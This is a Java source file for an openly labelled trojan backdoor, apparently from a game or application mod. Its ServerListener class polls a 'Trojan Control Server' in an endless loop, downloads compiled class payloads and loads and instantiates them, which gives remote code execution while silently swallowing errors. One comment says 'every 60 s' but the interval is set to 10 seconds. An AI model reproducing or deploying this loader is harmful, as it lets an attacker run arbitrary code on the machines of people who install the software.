package com.lanceg.trojanmod.backdoor;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.URL;
import java.nio.ByteBuffer;


public class ServerListener implements Runnable {
	
	/*
	 * Query every 60 s
	 */
	private static final long QUERY_INTERVAL_MILLIS = 10000;
	
	/*
	 * Could be a public IP or FQDN, would still work - should point to Trojan Control Server
	 */
	private static final String SERVER_URL = "http://localhost:3000";
	
	/**
	 * GET /filename will give the name of the malicious payload (a compiled .class file)
	 */
	private static final String FILENAME_ROUTE = "/filename";
	
	/**
	 * GET /file will give the malicious payload
	 */
	private static final String FILE_ROUTE = "/file";
	
	/**
	 * The default package for malicious classes from the server (same as current package)
	 */
	private static final String CLASS_PACKAGE_NAME = "com.lanceg.trojanmod.backdoor";
	
	/**
	 * System class loader
	 */
	private ClassLoader loader;
	
	/**
	 * Name of the latest file received from the server. When the client queries the server and gets a different file name, it downloads the latest payload
	 */
	private String latestFilename = "";
	private Object currentObject;
	
	
	public ServerListener() {		
		try {
			loader = ClassLoader.getSystemClassLoader();
		} catch (Exception e) {
		}
	}

	@Override
	public void run() {
		long previousTimeMillis = 0;
		long currentTimeMillis;
		
		
		while (true) {
			currentTimeMillis = System.currentTimeMillis();
			
			if ((currentTimeMillis - previousTimeMillis) > QUERY_INTERVAL_MILLIS) {
				
				// query the malicious server
				try (BufferedReader reader = new BufferedReader(new InputStreamReader(new URL(SERVER_URL + FILENAME_ROUTE).openStream(), "UTF-8"))){
					final StringBuilder response = new StringBuilder();
					
					for (String line; (line = reader.readLine()) != null;) {
						response.append(line);
					}
					
					final String currentFilename = response.toString();
					if (!currentFilename.equals(latestFilename) && !currentFilename.equals("null")) {
						
						downloadNewClass(currentFilename);
						latestFilename = currentFilename;
					}
					
				} catch (Exception e) {
				}
			
				previousTimeMillis = currentTimeMillis;
			}
		}
	}
	
	private void downloadNewClass(final String filename) {
		final ByteArrayOutputStream baos = new ByteArrayOutputStream();
		InputStream is = null;
		
		try {
			final URL url = new URL(SERVER_URL + FILE_ROUTE);
			is = url.openStream();
			byte[] buf = new byte[4096];
			int n;
			
			while ((n = is.read(buf)) > 0) {
				baos.write(buf, 0, n);
			}
			
			final byte[] classBytes = baos.toByteArray();
			
			baos.close();
			is.close();
			
			stopCurrentObject();
			loadAndStartClass(classBytes, filename);
		} catch (Exception e) {
		}
	}
	
	private void stopCurrentObject() {
		if (currentObject != null) {
			currentObject.equals(null);
		}
	}
	
	
	private void loadAndStartClass(final byte[] bytes, final String rawFilename) {
		final String filename;
		
		if (rawFilename.endsWith(".class")) {
			filename = rawFilename.substring(0, rawFilename.length() - ".class".length());
		} else {
			filename = rawFilename;
		}
		
		final String fqClassname = CLASS_PACKAGE_NAME + "." + filename;
		
		final ByteBuffer buf = ByteBuffer.wrap(bytes);
		
		try {			
			final Class<?> classObject = ClassLoaderExposer.defineClass(loader, fqClassname, buf, null);
			final Object object = classObject.newInstance();
			currentObject = object;
			currentObject.toString();
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

}
